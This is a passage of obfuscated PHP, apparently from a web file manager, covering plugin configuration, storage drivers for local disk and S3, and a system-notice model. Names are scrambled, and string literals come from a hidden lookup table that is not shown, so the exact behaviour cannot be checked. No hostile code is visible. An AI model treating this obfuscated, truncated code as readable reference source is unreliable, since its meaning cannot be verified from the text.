$“ƒØ«Ê© = PLUGIN_DIR . $ãÇè§ªë . $Ç®©àÓ[2104]; if (!is_array($úôÛ†á±) || !is_array($úôÛ†á±[$Ç®©àÓ[2102]]) || $úôÛ†á±[$Ç®©àÓ[815]] != 1 || !is_file($“ƒØ«Ê©)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$Ç®©àÓ[6]][$Ç®©àÓ[2105]] || !$GLOBALS[$Ç®©àÓ[6]][$Ç®©àÓ[2106]]) { return !0; } $Ÿ¾çŠ¥Ê = explode($Ç®©àÓ[50], strtolower($GLOBALS[$Ç®©àÓ[6]][$Ç®©àÓ[2106]])); return in_array(strtolower($ãÇè§ªë), $Ÿ¾çŠ¥Ê) ? !1 : !0; } if ($ı±‹Åø && !Action($Ç®©àÓ[2107])->checkAuth($ãÇè§ªë)) { return !1; } return !0; } public function unInstall($ÓªŒ©ŸÜ) { $õ¬Ò¥ïŞ =& $_SERVER[äô®•½Â]; $ŸØ·ıËÚ = $this->loadList($ÓªŒ©ŸÜ); if (file_exists(PLUGIN_DIR . $ÓªŒ©ŸÜ)) { Hook::apply($ÓªŒ©ŸÜ . $õ¬Ò¥ïŞ[2108]); } $this->remove($ŸØ·ıËÚ[$õ¬Ò¥ïŞ[486]]); } public function changeStatus($óôóáƒ, $ÇêÄ¸Ñ) { $ïÔöç“¢ =& $_SERVER[äô®•½Â]; $¦ª©û¼ = $this->loadList($óôóáƒ); if ($ÇêÄ¸Ñ) { Hook::apply($óôóáƒ . $ïÔöç“¢[2109]); } $this->update($¦ª©û¼[$ïÔöç“¢[486]], array($ïÔöç“¢[2110] => $ÇêÄ¸Ñ)); } public function appRegist($¸ôÎ¢­, $İµÑÌå) { $¼ÏŸö¢Í =& $_SERVER[äô®•½Â]; $‰­ŞÄ”· = $this->loadList($¸ôÎ¢­); if ($‰­ŞÄ”·) { $this->update($‰­ŞÄ”·[$¼ÏŸö¢Í[486]], array($¼ÏŸö¢Í[2102] => $İµÑÌå)); } else { $©­Úïı = array($¼ÏŸö¢Í[32] => $¸ôÎ¢­, $¼ÏŸö¢Í[2102] => $İµÑÌå, $¼ÏŸö¢Í[815] => 0, $¼ÏŸö¢Í[6] => $this->getConfigDefault($¸ôÎ¢­)); $this->insert($©­Úïı); } } public function getConfigDefault($êŒëÉ¢Ú) { $ü†Š»í€ =& $_SERVER[äô®•½Â]; $Ó°¹øÃŒ = array(); $ñÊºÇ”  = $this->getPackageJson($êŒëÉ¢Ú); if (!$ñÊºÇ”  && is_array($ñÊºÇ” [$ü†Š»í€[2111]])) { return $Ó°¹øÃŒ; } foreach ($ñÊºÇ” [$ü†Š»í€[2111]] as $°£È => $Ÿ›™ú‹Ÿ) { if (!isset($Ÿ›™ú‹Ÿ[$ü†Š»í€[461]]) || isset($Ó°¹øÃŒ[$°£È])) { continue; } $Ó°¹øÃŒ[$°£È] = $Ÿ›™ú‹Ÿ[$ü†Š»í€[461]]; } return $Ó°¹øÃŒ; } public function getPackageJson($¥Š•éÂø) { return Hook::apply($¥Š•éÂø . $_SERVER[äô®•½Â][2112]); } public function getConfig($ŸİĞ“¢, $µØâ·¯œ = false) { $êÖ¢ÃÏ =& $_SERVER[äô®•½Â]; $¼Á‰°¶œ = array(); $ÙÓöÂ¯ş = $this->loadList($ŸİĞ“¢); if ($ÙÓöÂ¯ş && is_array($ÙÓöÂ¯ş[$êÖ¢ÃÏ[6]])) { $¼Á‰°¶œ = $ÙÓöÂ¯ş[$êÖ¢ÃÏ[6]]; } if (!$¼Á‰°¶œ || $µØâ·¯œ) { $¼Á‰°¶œ = $this->getConfigDefault($ŸİĞ“¢); } return $¼Á‰°¶œ; } public function setConfig($¤®€™˜ò, $´„õÉÆ = false) { $´Ë¼š =& $_SERVER[äô®•½Â]; $ıä¶¢Â» = $this->loadList($¤®€™˜ò); if (!$ıä¶¢Â») { return !1; } $§½Å»˜¦ = $ıä¶¢Â»[$´Ë¼š[6]]; if ($´„õÉÆ == !1) { $§½Å»˜¦ = array(); $´„õÉÆ = $this->getConfigDefault($¤®€™˜ò); } foreach ($´„õÉÆ as $Ø°Úæ» => $‡Ç””Çß) { $§½Å»˜¦[$Ø°Úæ»] = is_string($‡Ç””Çß) ? trim($‡Ç””Çß) : $‡Ç””Çß; } $this->update($ıä¶¢Â»[$´Ë¼š[486]], array($´Ë¼š[6] => $§½Å»˜¦)); } public function viewList() { $›üû¼Âİ =& $_SERVER[äô®•½Â]; $ù§ŠòûÂ = $this->loadList(); $this->pluginScan($ù§ŠòûÂ); $ù§ŠòûÂ = $this->loadPluginList(); $â”ú¡ÛË = array(); foreach ($ù§ŠòûÂ as $‹Õ€Ù™È => $ŸıÛ±¥—) { $Î«¦†æ = $ŸıÛ±¥—; unset($ŸıÛ±¥—[$›üû¼Âİ[2102]], $ŸıÛ±¥—[$›üû¼Âİ[6]]); $ç¹êÉî = PLUGIN_DIR . $ŸıÛ±¥—[$›üû¼Âİ[32]] . $›üû¼Âİ[2104]; if (!is_file($ç¹êÉî)) { continue; } $Š™âôÏİ = Hook::apply($ŸıÛ±¥—[$›üû¼Âİ[32]] . $›üû¼Âİ[2112]); if (!is_array($Š™âôÏİ)) { continue; } $â”ú¡ÛË[$‹Õ€Ù™È] = array_merge($ŸıÛ±¥—, $Š™âôÏİ); if ($Î«¦†æ[$›üû¼Âİ[6]][$›üû¼Âİ[1689]] != $Š™âôÏİ[$›üû¼Âİ[1663]]) { Hook::apply($ŸıÛ±¥—[$›üû¼Âİ[32]] . $›üû¼Âİ[2109]); $Î«¦†æ[$›üû¼Âİ[6]][$›üû¼Âİ[1689]] = $Š™âôÏİ[$›üû¼Âİ[1663]]; $this->update($ŸıÛ±¥—[$›üû¼Âİ[486]], array($›üû¼Âİ[6] => $Î«¦†æ[$›üû¼Âİ[6]])); } } return $â”ú¡ÛË; } private function loadPluginList() { $Æú‹¢øÇ =& $_SERVER[äô®•½Â]; $§Ùµ° = $this->loadList(); if (strtolower(MOD) == $Æú‹¢øÇ[2113]) { return $§Ùµ°; } $ö§£‘ñ = Hook::trigger($Æú‹¢øÇ[2114], $§Ùµ°); if ($§Ùµ° && !$ö§£‘ñ) { die; } return $ö§£‘ñ ? $ö§£‘ñ : $§Ùµ°; } private function pluginScan($°„î¢Î) { $ŠİÔ£­— =& $_SERVER[äô®•½Â]; recursion_dir(PLUGIN_DIR, $á£Ù©“æ, $­Ÿœö¶, 0); foreach ($á£Ù©“æ as $«ïÇµ…¬) { $Ì†®ùÊó = get_path_this($«ïÇµ…¬); if (isset($°„î¢Î[$Ì†®ùÊó]) || !file_exists($«ïÇµ…¬ . $ŠİÔ£­—[2115]) || !file_exists($«ïÇµ…¬ . $ŠİÔ£­—[2104])) { continue; } Hook::apply($Ì†®ùÊó . $ŠİÔ£­—[2109]); } } } goto AçËøêåº; c»ËæŠèø: class PathDriverJOS extends PathDriverBaseS3 { public function __construct($¾ùÚô¥“) { parent::__construct($¾ùÚô¥“); $this->setSignVersion($_SERVER[äô®•½Â][250]); } public function uploadLink($§—ºŠ‚×, $º„¯§š™ = 0) { $ã¿á“ï» =& $_SERVER[äô®•½Â]; if ($this->isUploadServer()) { return; } $«Ø‘×¤Œ = $this->getType(); if (!in_array($«Ø‘×¤Œ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $•õ§½Ê† = (!$º„¯§š™ ? 1 : ceil($º„¯§š™ / pow(1024, 3))) * 3600 * 4; $ãª§Ö± = $this->uploadMultiData($§—ºŠ‚×, $•õ§½Ê†); if ($ãª§Ö±) { $ãª§Ö±[$ã¿á“ï»[97]] = $§—ºŠ‚×; $ãª§Ö±[$ã¿á“ï»[98]] = $«Ø‘×¤Œ; } return $ãª§Ö±; } public function fileOutImage($×³¬ôÓŒ, $í¯’Óà = 250) { if ($this->size($×³¬ôÓŒ) > 1024 * 1024 * 25) { return $this->fileOutImageServer($×³¬ôÓŒ, $í¯’Óà); } $ˆ¨Ÿí¬ = $this->link($×³¬ôÓŒ); $ˆ¨Ÿí¬ .= $_SERVER[äô®•½Â][1459] . $í¯’Óà; $this->fileOutLink($ˆ¨Ÿí¬); } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($ğØ„â­) { if (substr($ğØ„â­, 0, 2) == $_SERVER[äô®•½Â][1416]) { $ğØ„â­ = BASIC_PATH . substr($ğØ„â­, 2); } return $ğØ„â­; } public function iconvApp($–ƒığßŸ) { $ÏñöÖ›™ =& $_SERVER[äô®•½Â]; global $config; return $this->iconvTo($–ƒığßŸ, $config[$ÏñöÖ›™[1445]], $config[$ÏñöÖ›™[1444]]); } public function iconvSystem($Şõ§Ë°„) { $ªÑß¿Ç¯ =& $_SERVER[äô®•½Â]; global $config; return $this->iconvTo($Şõ§Ë°„, $config[$ªÑß¿Ç¯[1444]], $config[$ªÑß¿Ç¯[1445]]); } public function getPathOuter($½å²€±ı) { $®é‚¿í¿ =& $_SERVER[äô®•½Â]; $¾éĞ‚ä = $this->iconvApp($this->pathBase); $½å²€±ı = $this->iconvApp($½å²€±ı); if (substr($¾éĞ‚ä, 0, 2) == $®é‚¿í¿[1416]) { $¾éĞ‚ä = BASIC_PATH . substr($¾éĞ‚ä, 2); } if (substr($½å²€±ı, 0, 2) == $®é‚¿í¿[1416]) { $½å²€±ı = BASIC_PATH . substr($½å²€±ı, 2); } $¾éĞ‚ä = KodIO::clear($¾éĞ‚ä); $½å²€±ı = KodIO::clear($½å²€±ı); $½å²€±ı = substr($½å²€±ı, strlen($¾éĞ‚ä)); if (empty($this->pathDriver)) { return $½å²€±ı; } return $this->pathDriver . $®é‚¿í¿[8] . ltrim($½å²€±ı, $®é‚¿í¿[8]); } public function mkfile($Â™§æ¸ , $Íïå‚Û© = '', $¼™“İ—š = REPEAT_RENAME) { $Â™§æ¸  = $this->iconvSystem($Â™§æ¸ ); @touch($Â™§æ¸ ); if ($Íïå‚Û©) { file_put_contents($Â™§æ¸ , $Íïå‚Û©); } @chmod($Â™§æ¸ , $this->pathAuth); if (is_file($Â™§æ¸ )) { return $this->getPathOuter($Â™§æ¸ ); } $this->writeLog(__FUNCTION__ . $_SERVER[äô®•½Â][1456], !0); return !1; } public function mkdir($¥Ó²ÇšÁ, $ÛÁ‰“Ğ = REPEAT_SKIP) { $¥Ó²ÇšÁ = $this->iconvSystem($¥Ó²ÇšÁ); if (is_dir($¥Ó²ÇšÁ)) { return $this->getPathOuter($¥Ó²ÇšÁ); } @mkdir($¥Ó²ÇšÁ, $this->pathAuth, !0); @chmod($¥Ó²ÇšÁ, $this->pathAuth); if (is_dir($¥Ó²ÇšÁ)) { return $this->getPathOuter($¥Ó²ÇšÁ); } $this->writeLog(__FUNCTION__ . $_SERVER[äô®•½Â][1456], !0); return !1; } public function copyFile($„Ã‰í ‡, $’šÎæù) { $this->mkdir($this->pathFather($’šÎæù)); $„Ã‰í ‡ = $this->iconvSystem($„Ã‰í ‡); $’šÎæù = $this->iconvSystem($’šÎæù); $©‡Ÿ„úª = copy_64($„Ã‰í ‡, $’šÎæù); @chmod($’šÎæù, $this->pathAuth); if ($©‡Ÿ„úª) { return $this->getPathOuter($’šÎæù); } $this->writeLog(__FUNCTION__ . $_SERVER[äô®•½Â][1456], !0); return !1; } public function moveFile($Ë‰ÀÊøè, $ƒ÷Ã ÃŠ) { $this->mkdir($this->pathFather($ƒ÷Ã ÃŠ)); $Ë‰ÀÊøè = $this->iconvSystem($Ë‰ÀÊøè); $ƒ÷Ã ÃŠ = $this->iconvSystem($ƒ÷Ã ÃŠ); $ìÍÈÄ¡Ì = intval(@rename($Ë‰ÀÊøè, $ƒ÷Ã ÃŠ)); if (!$ìÍÈÄ¡Ì) { if ($ìÍÈÄ¡Ì = intval(@copy_64($Ë‰ÀÊøè, $ƒ÷Ã ÃŠ))) { @unlink($Ë‰ÀÊøè); } } @chmod($ƒ÷Ã ÃŠ, $this->pathAuth); if ($ìÍÈÄ¡Ì) { return $this->getPathOuter($ƒ÷Ã ÃŠ); } $this->writeLog(__FUNCTION__ . $_SERVER[äô®•½Â][1456], !0); return !1; } public function movePath($ìï´Å„ô, $ÏõŒšËÌ, $àæŸ—¡¾ = false) { $¸ã”ë· =& $_SERVER[äô®•½Â]; $ìï´Å„ô = $this->iconvSystem($ìï´Å„ô); $ÏõŒšËÌ = $this->iconvSystem($ÏõŒšËÌ); $ı¥ñôª° = rtrim($ÏõŒšËÌ, $¸ã”ë·[8]) . $¸ã”ë·[8] . ($àæŸ—¡¾ ? $àæŸ—¡¾ : get_path_this($ìï´Å„ô)); if (file_exists($ı¥ñôª°)) { return !1; } $ª•¼µÄ  = intval(@rename($ìï´Å„ô, $ı¥ñôª°)); $ª•¼µÄ  = file_exists($ı¥ñôª°); if ($ª•¼µÄ ) { return $this->getPathOuter($ı¥ñôª°); } $this->writeLog(__FUNCTION__ . $¸ã”ë·[1456], !0); return !1; } public function delFile($ÏŒà©õò) { $ÏŒà©õò = $this->iconvSystem($ÏŒà©õò); if (!@unlink($ÏŒà©õò)) { @chmod($ÏŒà©õò, $this->pathAuth); if (@unlink($ÏŒà©õò)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[äô®•½Â][1456], !0); return !1; } return !0; } public function delFolder($Ø¡¥©¸À) { $¹ê©Ä»— =& $_SERVER[äô®•½Â]; $Ø¡¥©¸À = $this->iconvSystem($Ø¡¥©¸À); if (!is_dir($Ø¡¥©¸À)) { return !0; } if (!($°ÎÀÄ­” = opendir($Ø¡¥©¸À))) { return !1; } while (($ÀÚß’¥ã = readdir($°ÎÀÄ­”)) !== !1) { if ($ÀÚß’¥ã == $¹ê©Ä»—[10] || $ÀÚß’¥ã == $¹ê©Ä»—[1361]) { continue; } $çæ‘œ = $Ø¡¥©¸À . $¹ê©Ä»—[8] . $ÀÚß’¥ã; if (is_file($çæ‘œ) || is_link($çæ‘œ)) { if (!unlink($çæ‘œ)) { chmod($çæ‘œ, $this->pathAuth); if (!unlink($çæ‘œ)) { return !1; } } } else { if (is_dir($çæ‘œ)) { chmod($çæ‘œ, $this->pathAuth); $çæ‘œ = $this->iconvApp($çæ‘œ); if (!$this->delFolder($çæ‘œ)) { return !1; } } } } closedir($°ÎÀÄ­”); return rmdir($Ø¡¥©¸À); } public function rename($Ø’ÉË†İ, $ãóø—Ë) { $²‚Ÿ±µ“ =& $_SERVER[äô®•½Â]; $ª‚ËÉ‚± = $this->fileNameAuto($this->pathFather($Ø’ÉË†İ), $ãóø—Ë); $ª‚ËÉ‚± = $this->iconvSystem($ª‚ËÉ‚±); $Ø’ÉË†İ = $this->iconvSystem($Ø’ÉË†İ); $÷»›ºÁÇ = $this->pathFather($Ø’ÉË†İ); $ÀˆûÚ³® = rtrim($÷»›ºÁÇ, $²‚Ÿ±µ“[8]) . $²‚Ÿ±µ“[8] . $ª‚ËÉ‚±; $á£¹ÜŒÍ = @rename($Ø’ÉË†İ, $ÀˆûÚ³®); $ÀˆûÚ³® = $this->iconvApp($ÀˆûÚ³®); if ($á£¹ÜŒÍ) { return $this->getPathOuter($ÀˆûÚ³®); } $this->writeLog(__FUNCTION__ . $²‚Ÿ±µ“[1456], !0); return !1; } public function size($—¥Ó™ô) { $—¥Ó™ô = $this->iconvSystem($—¥Ó™ô); return filesize_64($—¥Ó™ô); } public function info($Šü‰ù½) { $Šü‰ù½ = $this->iconvSystem($Šü‰ù½); if ($this->isFolder($Šü‰ù½)) { return $this->folderInfo($Šü‰ù½); } else { if ($this->isFile($Šü‰ù½)) { return $this->fileInfo($Šü‰ù½); } } return !1; } protected function infoChildren($”ãÇ·ï, &$¥ºÚĞ‹í, $¬›——íà = true) { $íñ«ÖÛ— =& $_SERVER[äô®•½Â]; check_abort_echo(); $”ãÇ·ï = rtrim($”ãÇ·ï, $íñ«ÖÛ—[8]) . $íñ«ÖÛ—[8]; if ($¬›——íà) { $”ãÇ·ï = $this->iconvSystem($”ãÇ·ï); } if (!($èµŠª…ë = @opendir($”ãÇ·ï))) { return; } while (($±˜Û¸ = readdir($èµŠª…ë)) !== !1) { if ($±˜Û¸ == $íñ«ÖÛ—[10] || $±˜Û¸ == $íñ«ÖÛ—[1361]) { continue; } $şŠ´‹æ = $”ãÇ·ï . $±˜Û¸; if (is_file($şŠ´‹æ) || is_link($şŠ´‹æ)) { $¥ºÚĞ‹í[$íñ«ÖÛ—[80]]++; $¥ºÚĞ‹í[$íñ«ÖÛ—[79]] += filesize_64($şŠ´‹æ); } else { if (is_dir($şŠ´‹æ)) { $¥ºÚĞ‹í[$íñ«ÖÛ—[81]]++; $this->infoChildren($şŠ´‹æ, $¥ºÚĞ‹í, !1); } } } closedir($èµŠª…ë); } private function folderInfo($Ú´¿€ÛÊ, $ËÙ¨ ¯ = false) { $³”¥¤‡© =& $_SERVER[äô®•½Â]; $Ú´¿€ÛÊ = rtrim($Ú´¿€ÛÊ, $³”¥¤‡©[8]) . $³”¥¤‡©[8]; $±‹³½ãº = $this->iconvApp($this->pathThis($Ú´¿€ÛÊ)); if ($ËÙ¨ ¯) { return array($³”¥¤‡©[32] => $±‹³½ãº, $³”¥¤‡©[87] => $this->getPathOuter($Ú´¿€ÛÊ), $³”¥¤‡©[33] => $³”¥¤‡©[78]); } $šÀ†Ìª¯ = array($³”¥¤‡©[32] => $±‹³½ãº, $³”¥¤‡©[87] => $this->getPathOuter($Ú´¿€ÛÊ), $³”¥¤‡©[33] => $³”¥¤‡©[78], $³”¥¤‡©[234] => @filectime($Ú´¿€ÛÊ), $³”¥¤‡©[88] => @filemtime($Ú´¿€ÛÊ), $³”¥¤‡©[1460] => @fileatime($Ú´¿€ÛÊ), $³”¥¤‡©[1461] => is_readable($Ú´¿€ÛÊ), $³”¥¤‡©[1462] => is_writable($Ú´¿€ÛÊ), $³”¥¤‡©[1463] => get_mode($Ú´¿€ÛÊ)); return $šÀ†Ìª¯; } private function fileInfo($šÈ‡æ¾ˆ, $ôİŸ·‡Â = false) { $ÊÁÚçí =& $_SERVER[äô®•½Â]; $±ˆĞ»û = $this->iconvApp($this->pathThis($šÈ‡æ¾ˆ)); if ($ôİŸ·‡Â) { return array($ÊÁÚçí[32] => $±ˆĞ»û, $ÊÁÚçí[87] => $this->getPathOuter($šÈ‡æ¾ˆ), $ÊÁÚçí[33] => $ÊÁÚçí[233], $ÊÁÚçí[79] => $this->size($šÈ‡æ¾ˆ), $ÊÁÚçí[169] => $this->ext($±ˆĞ»û)); } $ñÔ¬Ğæ¤ = array($ÊÁÚçí[32] => $±ˆĞ»û, $ÊÁÚçí[87] => $this->getPathOuter($šÈ‡æ¾ˆ), $ÊÁÚçí[33] => $ÊÁÚçí[233], $ÊÁÚçí[234] => @filectime($šÈ‡æ¾ˆ), $ÊÁÚçí[88] => @filemtime($šÈ‡æ¾ˆ), $ÊÁÚçí[1460] => @fileatime($šÈ‡æ¾ˆ), $ÊÁÚçí[79] => $this->size($šÈ‡æ¾ˆ), $ÊÁÚçí[169] => $this->ext($±ˆĞ»û), $ÊÁÚçí[1461] => is_readable($šÈ‡æ¾ˆ), $ÊÁÚçí[1462] => is_writable($šÈ‡æ¾ˆ), $ÊÁÚçí[1463] => get_mode($šÈ‡æ¾ˆ)); return $ñÔ¬Ğæ¤; } public function exist($Ø»ÇäÆ) { $Ø»ÇäÆ = $this->iconvSystem($Ø»ÇäÆ); return @file_exists($Ø»ÇäÆ); } public function isFile($ “Ò“öÆ) { $ “Ò“öÆ = $this->iconvSystem($ “Ò“öÆ); return @is_file($ “Ò“öÆ); } public function isFolder($éš”éò ) { $éš”éò  = $this->iconvSystem($éš”éò ); return @is_dir($éš”éò ); } public function listPath($ğò‹ãï , $ıöú’ºÃ = false) { $èŠÓ”œ’ =& $_SERVER[äô®•½Â]; $ğò‹ãï  = $this->iconvSystem($ğò‹ãï ); $ğò‹ãï  = rtrim($ğò‹ãï , $èŠÓ”œ’[8]) . $èŠÓ”œ’[8]; $õ€ã×“¢ = array($èŠÓ”œ’[85] => array(), $èŠÓ”œ’[86] => array()); if (!($œ¡ìÔÛ = @opendir($ğò‹ãï ))) { return $õ€ã×“¢; } while (($†İ½Ã«õ = readdir($œ¡ìÔÛ)) !== !1) { if ($†İ½Ã«õ == $èŠÓ”œ’[10] || $†İ½Ã«õ == $èŠÓ”œ’[1361]) { continue; } $Âšçú• = $ğò‹ãï  . $†İ½Ã«õ; if (is_file($Âšçú•)) { $õ€ã×“¢[$èŠÓ”œ’[86]][] = $this->fileInfo($Âšçú•, $ıöú’ºÃ); } else { $õ€ã×“¢[$èŠÓ”œ’[85]][] = $this->folderInfo($Âšçú•, $ıöú’ºÃ); } } closedir($œ¡ìÔÛ); return $õ€ã×“¢; } public function listAll($³é¬Ñ“ƒ, &$ƒÂÊùèÊ = array()) { $€à„‚Û =& $_SERVER[äô®•½Â]; $³é¬Ñ“ƒ = $this->iconvSystem($³é¬Ñ“ƒ); $³é¬Ñ“ƒ = rtrim($³é¬Ñ“ƒ, $€à„‚Û[8]) . $€à„‚Û[8]; if (!($Ä¡ªÏ¾“ = @opendir($³é¬Ñ“ƒ))) { return $ƒÂÊùèÊ; } while (($¢ÛéêÒô = readdir($Ä¡ªÏ¾“)) !== !1) { if ($¢ÛéêÒô == $€à„‚Û[10] || $¢ÛéêÒô == $€à„‚Û[1361]) { continue; } $¦»•µè = $³é¬Ñ“ƒ . $¢ÛéêÒô; $×©É¶²º = is_dir($¦»•µè) && !is_link($¦»•µè) ? 1 : 0; $¦»•µè = $×©É¶²º ? $¦»•µè . $€à„‚Û[8] : $¦»•µè; $ƒÂÊùèÊ[] = array($€à„‚Û[87] => $this->getPathOuter($¦»•µè), $€à„‚Û[78] => $×©É¶²º, $€à„‚Û[88] => intval(@filemtime($¦»•µè)), $€à„‚Û[79] => $×©É¶²º ? 0 : intval($this->size($¦»•µè))); if ($×©É¶²º) { $this->listAll($¦»•µè, $ƒÂÊùèÊ); } } closedir($Ä¡ªÏ¾“); return $ƒÂÊùèÊ; } public function has($ÂÍ÷ÜÇß, $‚ßÅ¿ = false, $»ü±¤Üê = true) { $½åÙ•Î´ =& $_SERVER[äô®•½Â]; $ÂÍ÷ÜÇß = $this->iconvSystem($ÂÍ÷ÜÇß); $ÂÍ÷ÜÇß = rtrim($ÂÍ÷ÜÇß, $½åÙ•Î´[8]) . $½åÙ•Î´[8]; if (!($Êšœëü‘ = @opendir($ÂÍ÷ÜÇß))) { return !1; } $“«úĞÇ’ = 0; $±ò¤™’õ = 0; $ö†ìÔò÷ = 0; while (($ìˆÜ–öÄ = readdir($Êšœëü‘)) !== !1) { if ($ìˆÜ–öÄ == $½åÙ•Î´[10] || $ìˆÜ–öÄ == $½åÙ•Î´[1361]) { continue; } $•ß†ªÇ¢ = $ÂÍ÷ÜÇß . $ìˆÜ–öÄ; if ($‚ßÅ¿) { $ö†ìÔò÷++; if (@is_file($•ß†ªÇ¢)) { $“«úĞÇ’++; } else { $±ò¤™’õ++; } if ($ö†ìÔò÷ > 10000) { break; } continue; } if ($»ü±¤Üê) { if (@is_file($•ß†ªÇ¢)) { return !0; } } else { if (@is_dir($•ß†ªÇ¢ . $½åÙ•Î´[8])) { return !0; } } } closedir($Êšœëü‘); if ($‚ßÅ¿) { return array($½åÙ•Î´[242] => $“«úĞÇ’, $½åÙ•Î´[243] => $±ò¤™’õ); } return !1; } public function hashSimple($áò•®ğÌ) { $‰ĞØ”Ì­ =& $_SERVER[äô®•½Â]; if (!$áò•®ğÌ) { return md5($‰ĞØ”Ì­[12]); } $áò•®ğÌ = $this->iconvSystem($áò•®ğÌ); $­ÏÙ™Âó = $this->size($áò•®ğÌ); $öÃ”åÖÊ = 200; $•Ñ¥şıÃ = 50; if ($­ÏÙ™Âó <= $öÃ”åÖÊ * $•Ñ¥şıÃ) { return $this->hashMd5($áò•®ğÌ) . $­ÏÙ™Âó; } $ºî¾çÃ» = $‰ĞØ”Ì­[12]; $¹Â±Ûƒ = intval($­ÏÙ™Âó / $•Ñ¥şıÃ); $å¹îĞÇ = fopen($áò•®ğÌ, $‰ĞØ”Ì­[1464]); if (!$å¹îĞÇ) { return $ºî¾çÃ»; } for ($óÎ±¼¬ß = 0; $óÎ±¼¬ß < $•Ñ¥şıÃ; $óÎ±¼¬ß++) { fseek_64($å¹îĞÇ, $¹Â±Ûƒ * $óÎ±¼¬ß); $ºî¾çÃ» .= fread($å¹îĞÇ, $öÃ”åÖÊ); } fseek_64($å¹îĞÇ, $­ÏÙ™Âó - $öÃ”åÖÊ); $ºî¾çÃ» .= fread($å¹îĞÇ, $öÃ”åÖÊ); fclose($å¹îĞÇ); return md5($ºî¾çÃ») . $­ÏÙ™Âó; } public function getContent($­Ö£¶æÙ) { $­Ö£¶æÙ = $this->iconvSystem($­Ö£¶æÙ); return file_get_contents($­Ö£¶æÙ); } public function setContent($’íï€şö, $î”ï”ŠÚ = '') { $’íï€şö = $this->iconvSystem($’íï€şö); $“ÈÕ¼æç = @file_put_contents($’íï€şö, $î”ï”ŠÚ, LOCK_EX); if (!$“ÈÕ¼æç) { $this->writeLog(__FUNCTION__ . $_SERVER[äô®•½Â][1456], !0); } clearstatcache(); @chmod($’íï€şö, $this->pathAuth); return $“ÈÕ¼æç === !1 ? !1 : !0; } public function fileSubstr($ßƒáğïû, $†šâõÇÚ = 0, $É‹Áå×È = false) { $ş¸§î¹ =& $_SERVER[äô®•½Â]; $ßƒáğïû = $this->iconvSystem($ßƒáğïû); if ($É‹Áå×È === !1) { $É‹Áå×È = $this->size($ßƒáğïû); } if ($É‹Áå×È <= 0) { return $ş¸§î¹[12]; } $œğÇÜ¾Ù = fopen($ßƒáğïû, $ş¸§î¹[1464]); if (!$œğÇÜ¾Ù) { return !1; } fseek_64($œğÇÜ¾Ù, $†šâõÇÚ); $âğÖğ²“ = fread($œğÇÜ¾Ù, $É‹Áå×È); fclose($œğÇÜ¾Ù); if (!$âğÖğ²“) { $this->writeLog(__FUNCTION__ . $ş¸§î¹[1456], !0); } return $âğÖğ²“; } public function upload($£¥ä¼çÖ, $±Ã“è¨õ, $¨ì¼ù®¾ = false, $€Ò“ôÃ = REPEAT_REPLACE) { if ($¨ì¼ù®¾) { return $this->moveFile($±Ã“è¨õ, $£¥ä¼çÖ); } return $this->copyFile($±Ã“è¨õ, $£¥ä¼çÖ); } public function setModifyTime($Ç’ú²¤†, $ÚÕ˜êÍô = '') { @touch($Ç’ú²¤†, intval($ÚÕ˜êÍô)); } public function download($ëáø¤ÇË, $Õıµá™Î) { return $this->iconvSystem($ëáø¤ÇË); } } $_file = $_SERVER[$_SERVER[äô®•½Â][332]]; goto Cõá¢áƒ©É; D¸‹…¨•§…: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\155\56\x6e\157\x74\x69\143\145\114\x69\x73\164"; public $field = array("\156\141\155\x65", "\x63\x6f\x6e\x74\x65\156\x74", "\141\x75\164\150", "\155\157\144\145", "\164\x69\x6d\x65", "\164\171\x70\145", "\x6c\145\x76\x65\154", "\145\156\x61\x62\x6c\x65", "\163\157\162\164"); public function listData($³¬µÃâÛ = false, $¦éõõ‰ = "\x73\x6f\x72\164", $»›Ò¢¾Ü = false) { return parent::listData($³¬µÃâÛ, $¦éõõ‰, $»›Ò¢¾Ü); } public function add($ÛÙ©‹³ê) { $ÉÂ¢È =& $_SERVER[äô®•½Â]; $¤®È¬¤˜ = time(); if ($ÛÙ©‹³ê[$ÉÂ¢È[16]] == $ÉÂ¢È[2459]) { $¤®È¬¤˜ = strtotime($ÛÙ©‹³ê[$ÉÂ¢È[207]]); } $ÛÙ©‹³ê[$ÉÂ¢È[207]] = $¤®È¬¤˜; return parent::insert($ÛÙ©‹³ê); } public function update($ìø­ÅØà, $¾–ôÙê) { $¤‡¬áÖ‡ =& $_SERVER[äô®•½Â]; $ÇêÔĞÏ‹ = $this->listData($ìø­ÅØà); if (!$ÇêÔĞÏ‹) { return !1; } $¸ß“‰ = time(); if ($¾–ôÙê[$¤‡¬áÖ‡[16]] == $¤‡¬áÖ‡[2459]) { $¸ß“‰ = strtotime($¾–ôÙê[$¤‡¬áÖ‡[207]]); } $¾–ôÙê[$¤‡¬áÖ‡[207]] = $¸ß“‰; return parent::update($ìø­ÅØà, $¾–ôÙê); } public function remove($³†ÛÎ‘ó) { $´²¢Œ™¸ = $this->listData($³†ÛÎ‘ó); if (!$´²¢Œ™¸ || $´²¢Œ™¸[$_SERVER[äô®•½Â][192]]) { return !1; } return parent::remove($³†ÛÎ‘ó); } public function sort($ÈÒöãê‡, $™Ã¾ñ›ç) { return parent::update($ÈÒöãê‡, $™Ã¾ñ›ç); } public function enable($ë¤çİ¼Ü, $ËëŠœÅë) { return parent::update($ë¤çİ¼Ü, array($_SERVER[äô®•½Â][2460] => $ËëŠœÅë)); } private function initUserOption() { $ÚšÄÓğ¤ =& $_SERVER[äô®•½Â]; $this->optionType = $ÚšÄÓğ¤[2461]; $this->modelType = $ÚšÄÓğ¤[2462]; $this->field = array($ÚšÄÓğ¤[2463], $ÚšÄÓğ¤[32], $ÚšÄÓğ¤[207], $ÚšÄÓğ¤[33], $ÚšÄÓğ¤[2464], $ÚšÄÓğ¤[815], $ÚšÄÓğ¤[229]); } public function userNoticeGet($Á´›ëÔ = false) { $this->initUserOption(); return parent::listData($Á´›ëÔ, $_SERVER[äô®•½Â][486], !0); } public function userNoticeAdd($™âÓ£Æ‰) { $œ±Ó´É  =& $_SERVER[äô®•½Â]; $this->initUserOption(); $”±ö¿íß = $this->findByKey($œ±Ó´É [2463], $™âÓ£Æ‰[$œ±Ó´É [486]]); if ($”±ö¿íß) { return !0; } $ßÕ‰á¨ª = 